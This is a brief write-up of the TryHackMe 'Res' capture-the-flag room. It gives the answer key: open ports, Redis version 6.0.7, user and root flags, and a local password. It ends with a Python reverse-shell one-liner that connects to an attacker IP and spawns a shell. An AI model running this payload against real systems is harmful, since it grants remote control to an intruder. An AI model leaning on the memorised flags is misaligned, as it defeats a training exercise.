# TryHackMe Res

> Saikat Karmakar | AUG 23 : 2021

---

## Task 1

1. Scan the machine, how many ports are open?
```
2
```
2. What's is the database management system installed on the server?
```
redis
```
3. What port is the database management system running on?
```
6379
```
4. What's is the version of management system installed on the server?
```
6.0.7
```
5. Compromise the machine and locate user.txt
```
thm{red1s_rce_w1thout_credent1als}
```
6. What is the local user account password?
```
beautiful1
```
7. Escalate privileges and obtain root.txt
```
thm{xxd_pr1v_escalat1on}
```

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.23.120",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```